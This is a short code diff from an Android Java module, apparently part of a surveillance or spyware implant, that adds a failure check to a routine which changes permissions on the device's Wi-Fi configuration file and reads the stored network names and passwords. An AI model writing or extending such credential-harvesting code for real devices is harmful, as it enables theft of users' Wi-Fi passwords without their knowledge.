@@ -116,7 +116,12 @@ public class ModulePassword extends BaseModule {
 
 	private void dumpWifi() {
 		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
-		Path.unprotect(filename, 2, false);
+		if(!Path.unprotect(filename, 2, false)){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpWifi) no passwords found");
+			}
+			return;
+		}
 		List<String> lines = StringUtils.readFileLines(filename);
 		String ssid = "";
 		String psk = "";
